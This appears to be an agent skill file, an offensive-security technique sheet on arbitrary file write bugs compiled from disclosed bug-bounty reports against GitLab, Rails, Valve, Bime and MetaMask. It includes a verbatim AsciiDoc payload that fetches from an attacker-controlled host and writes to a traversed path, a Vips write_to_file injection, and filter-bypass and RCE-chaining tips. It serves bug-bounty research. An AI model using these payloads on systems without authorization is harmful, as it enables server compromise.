---
name: hunter-l3-arbitrary-file-write
description: "Use when hunting Arbitrary File Write on a target. Loads the L3 technique sheet: Arbitrary file write bugs let an attacker place attacker-controlled content at a server-side (or client-side) path of their choosing."
domain: cybersecurity
subdomain: web
tags:
- web
- arbitrary-file-write
- hunting
- l3
version: '1.0'
---

# Arbitrary File Write — Technique Sheet

## Overview
Arbitrary file write bugs let an attacker place attacker-controlled content at a server-side (or client-side) path of their choosing. They pay well because a write primitive frequently chains to RCE (dropping cron entries, SSH keys, DLLs, template files), persistent defacement, or disk exhaustion. The records here cluster into five distinct root-cause shapes: attribute/config re-enable + SSRF-fetch-to-disk (AsciiDoc/Kroki), unsafe passthrough of transformation options to native libraries (Vips), JDBC driver file-creation side effects, path validation done on the wrong part of the string (substring checks), and mobile client-side auto-download via deeplink.

## Distinct sub-patterns

### 1. AsciiDoc `counter:` directive re-enabling disabled Kroki attributes → fetch-and-write via path traversal
- Endpoint shape / parameters: `POST /{namespace}/{project}/wikis` (GitLab wiki, AsciiDoc content). Relevant parameters are inside the AsciiDoc document itself: `kroki-fetch-diagram`, `kroki-server-url`, `outdir`, `imagesdir`, and the `format` argument of the plantuml block macro.
- Payload that actually fired (verbatim):
  ```
  [#goals]
  :imagesdir: diag-58f90331904a1989259d639c5677e0fff5e434e739c70f1d3bb2004723bc99b8.
  :outdir: /tmp/

  [plantuml, test="{counter:kroki-fetch-diagram:true}",tet="{counter:kroki-server-url:http://192.168.69.1:8082/}", format="/../../../../../../tmp/test_file_write.txt"]
  ....
  class BlockProcessor
  ....
  ```
- Root cause: Kroki fetch/server-url attributes are supposed to be disabled server-side. The AsciiDoc `counter:` directive re-enables disabled attributes (`{counter:kroki-fetch-diagram:true}` and `{counter:kroki-server-url:...}`), so the renderer fetches content from an attacker-controlled URL. The write destination is controlled through traversal in `format` (`/../../../../../../tmp/test_file_write.txt`) together with `outdir` and `imagesdir`.
- Impact proven: Wrote attacker-controlled content (demonstrated with an SSH public key) to `/tmp/test_file_write.txt` on the GitLab server; arbitrary file write as a path to RCE.
- Exemplar report: 1098793 (GitLab).
- Chain seen: (1) counter re-enables disabled kroki-fetch-diagram and sets kroki-server-url to an attacker server; (2) path traversal in format/outdir/imagesdir redirects the fetched file to an arbitrary path.

### 2. Transformation-option passthrough to Vips → `write_to_file` on arbitrary paths
- Endpoint shape / parameters: `GET /images/variant` with parameters `t` (transformation) and `v` (variant). The dangerous value travels inside the transformation parameter: `write_to_file: "/tmp/pwned.png"`.
- Payload: `write_to_file: "/tmp/pwned.png"` (via the `t`/`v` parameters on the variant endpoint).
- Root cause: The Vips transformer inherits a base `validate_transformation` that only blocks `combine_options`. Any other Vips operation — including `write_to_file` — passes validation and is dispatched to `Vips::Image` via `public_send`, so the library performs whatever op the attacker names, with attacker-controlled arguments.
- Impact proven: Docker PoC created `/tmp/pwned.png` (VULNERABLE). Arbitrary-path writes of image data; defacement of avatars/assets; disk exhaustion. A secondary vector: a source override discloses other users' images (read primitive chained with the write endpoint).
- Exemplar report: 3553340 (Ruby on Rails).

### 3. JDBC driver file creation via database connector
- Endpoint shape / parameters: The application's Vertica database connector (Bime). No specific endpoint or parameter stated in the record — the write occurs on the backend hosts as a side effect of the JDBC driver.
- Payload: payload not stated.
- Root cause: The JDBC driver used by the Vertica connector permits file creation on the backend hosts. The connector exposes this driver behavior to users who control connector configuration.
- Impact proven: Confirmed the Vertica connector's JDBC driver allows creating files on the backends (no further detail given in the record).
- Exemplar report: 112166 (Bime).
- Note: this sub-pattern is the least documented of the set — treat it as "check every data-source/connector configuration UI for driver-level file operations" rather than a copy-paste technique.

### 4. File-extension validation as substring check → arbitrary name/extension writes (game server)
- Endpoint shape / parameters: The `load` command of a GoldSrc HLDS console, with the save file path as the parameter. The attacker controls the path embedded in a `.sav` resource file.
- Payload: `fakeresource.sav` (crafted resource whose embedded file path smuggles the extension).
- Root cause: The file-extension check is a substring check (`HL?`) applied to the whole path, not anchored to the end, and `..` is the only blocked substring. By embedding `HL1` in the middle of the path and choosing the final extension, arbitrary filenames/extensions pass validation.
- Impact proven: Wrote `test.HL1.dll` (containing `Hello World!`) into the SAVE directory — i.e., a native DLL planted in a directory the game server touches.
- Exemplar report: 458842 (Valve).
- Chain seen: (1) craft a `.sav` whose embedded file path contains `HL1` in the middle and a chosen final extension; (2) server sets gamedir to `_downloads` and issues load/receive, writing the file.

### 5. Mobile deeplink → silent auto-download to disk
- Endpoint shape / parameters: MetaMask Android in-app browser deeplink (no HTTP endpoint; the entry point is the app's deeplink scheme).
- Payload: payload not stated.
- Root cause: A deeplink opens the in-app browser and can immediately trigger a file download with no confirmation prompt, so attacker-supplied content lands on disk without user awareness.
- Impact proven: Attacker deeplink triggered immediate download of an attacker-supplied file to disk on the MetaMask Android app without user awareness (arbitrary file write proven).
- Exemplar report: 1768166 (MetaMask).
- Chain seen: (1) deeplink into MetaMask in-app browser; (2) trigger immediate download of attacker file; (3) no confirmation prompt before file written to disk.

## Bypass / chain notes
- Filter bypass — attribute disabling (pattern 1): server-side "disabled attribute" protections are bypassed by AsciiDoc's `counter:` directive, which initializes/re-enables an attribute inline: `{counter:kroki-fetch-diagram:true}`. Any renderer that disables attributes but still evaluates counter substitutions is vulnerable to this trick.
- Filter bypass — extension anchoring (pattern 4): extension/whitelist checks that run `contains` against the full path (rather than matching the suffix) are defeated by placing the whitelisted token mid-path: `test.HL1.dll` satisfies an `HL?` substring check while carrying an arbitrary final extension. Only `..` was blocked, so same-directory writes with new names were trivially available.
- Chain — fetch-and-write: the strongest chain in the records combines an SSRF-style fetch (attacker-controlled `kroki-server-url`) with a path-traversal write target (`format`/`outdir`/`imagesdir`), yielding attacker-controlled content at an attacker-chosen absolute path (`/../../../../../../tmp/test_file_write.txt`) — the two halves you need for RCE.
- Chain — option passthrough to native lib: when an API layer whitelists parameters but the underlying native library accepts dangerous operations, enumerate the native library's own operation names (`write_to_file`) and inject them as "transformations". The same public_send dispatch surface also leaked other users' images via a source override — one dispatch bug, both write and read primitives.
- Chain — mobile: deeplink entry → in-app browser → silent download is a 3-step chain where each step is individually unremarkable; the combination (no user consent at the write step) is what made it reportable.

## Gotchas / what NOT to do
- Don't assume a disabled/blocked attribute stays blocked — test whether templating directives (`counter:`, defaults, etc.) can re-initialize it. In GitLab 1098793 the entire security control was bypassed by one inline directive.
- Don't assume the validation layer is the last word. In the Rails/Vips case, the transformer's validator only blocked `combine_options`; the real attack surface was `Vips::Image` ops reached via `public_send`. Always enumerate what the underlying library can do, not just what the validator names.
- Watch where the extension check anchors. Substring or `contains`-style checks on full paths (Valve) validate the wrong slice of the string; a whitelisted token anywhere in the path passes.
- A "no further detail" confirmation still counts: Bime 112166 was accepted on demonstrating the JDBC driver creates files on backends — you don't always need full RCE, but you do need to prove the write actually lands.
- Client-side writes are reportable when consent is bypassed (MetaMask deeplink auto-download), not merely because a file exists in a cache/downloads dir — frame impact around the missing prompt/user awareness.
- Path traversal depth: the GitLab payload needed `/../../../../../../tmp/...` (7 levels) — don't give up on traversal because a short `../` sequence fails; and note the write was into `/tmp`, i.e. even without a more privileged path the bug was accepted.
- Don't invent pivot steps you haven't demonstrated: the GitLab report showed SSH-key-in-/tmp as evidence toward RCE, but the proven impact in-record is the write itself.

## Real-world impact examples
- GitLab (1098793): attacker-controlled content — specifically an SSH public key — written to `/tmp/test_file_write.txt` on a GitLab server via wiki AsciiDoc + Kroki fetch, demonstrating a direct route from a wiki edit to server compromise.
- Ruby on Rails (3553340): `write_to_file: "/tmp/pwned.png"` on `GET /images/variant` created `/tmp/pwned.png` in a Docker PoC; same dispatch flaw exposed other users' images via source override and enabled avatar/asset defacement and disk exhaustion.
- Valve (458842): `test.HL1.dll` containing `Hello World!` planted in the HLDS SAVE directory via a crafted `fakeresource.sav` — a native library landing in a directory the game engine loads from.
- Bime (112166): confirmed file creation on backend hosts through the Vertica JDBC connector.
- MetaMask (1768166): attacker deeplink silently downloaded an attacker-supplied file to disk on the Android app with no confirmation prompt.